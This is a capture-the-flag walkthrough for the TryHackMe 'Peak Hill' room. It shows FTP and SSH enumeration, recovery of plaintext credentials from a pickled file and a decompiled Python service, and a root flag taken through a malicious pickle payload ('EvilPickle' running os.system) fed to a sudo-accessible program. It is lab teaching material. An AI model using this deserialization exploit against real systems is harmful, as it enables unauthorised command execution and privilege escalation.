# [Peak Hill](https://tryhackme.com/room/peakhill)

## Exercises in Python library abuse and some exploitation techniques

# Peak Hill

## Deploy and compromise the machine!

### What is the user flag?

1. Perform network service enumeration to identify available services and their versions

```bash
nmap -sV <TARGET_IP>
```

[SCREEN01]

2. Connect to the identified FTP service using anonymous credentials to enumerate accessible files

```bash
ftp <TARGET_IP>
anonymous
get test.txt
get .creds
```

3. Process the `.creds` file content through CyberChef binary decoder. Input the binary content into [CyberChef](https://gchq.github.io/CyberChef/), apply "From Binary" operation, and download the resulting output as a `.dat` file

4. Execute the downloaded `.dat` file using Python's pickle module to extract embedded credentials. The deserialized data reveals user authentication information
   - The extracted credentials are: `gherkin:p1ckl3s_@11_@r0und_th3_w0rld`

```python
import pickle
with open("download.dat", "rb") as file:
    pickle_data = file.read()
    creds = pickle.loads(pickle_data)
    print(creds)
```

[SCREEN02]

5. Establish SSH connection using the obtained credentials to gain initial system access

```bash
ssh gherkin@<TARGET_IP>
```

6. Transfer and decompile the Python compiled bytecode file to examine the underlying source code structure

```bash
scp gherkin@10.10.157.4:cmd_service.pyc .
sudo pip3 install uncompyle6
uncompyle6 cmd_service.pyc
```

[SCREEN03]

7. Analyze the decompiled code to identify encoded numerical values representing authentication credentials. Apply cryptographic conversion to decode the values
   - The decoded credentials are: `dill:n3v3r_@_d1ll_m0m3nt`

```python
from Crypto.Util.number import long_to_bytes

username_encoded = 1684630636
password_encoded = 2457564920124666544827225107428488864802762356

username = long_to_bytes(username_encoded).decode('utf-8')
password = long_to_bytes(password_encoded).decode('utf-8')

print(f"Username: {username}")
print(f"Password: {password}")
```

[SCREEN04]

8. Connect to the identified network service using the decoded credentials and locate the user flag

```bash
nc <TARGET_IP> 7321
cat /home/dill/user.txt
```

[SCREEN05]

---

### What is the root flag?

1. Examine available sudo permissions to identify potential privilege escalation vectors

```bash
sudo -l
```

2. Construct a pickle object containing arbitrary command execution functionality. The payload exploits Python's pickle deserialization to execute system commands with elevated privileges
   - Generated payload: `gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==`

```python
#!/usr/bin/env python3
import pickle
import os
import base64

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('cat /root/*', ))
pickle_data = pickle.dumps(EvilPickle())

print(base64.b64encode(pickle_data))
```

3. Execute the malicious pickle payload through the identified sudo-accessible application to achieve root-level command execution and retrieve the root flag

```bash
echo "gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==" | sudo /opt/peak_hill_farm/peak_hill_farm
```

[SCREEN07]
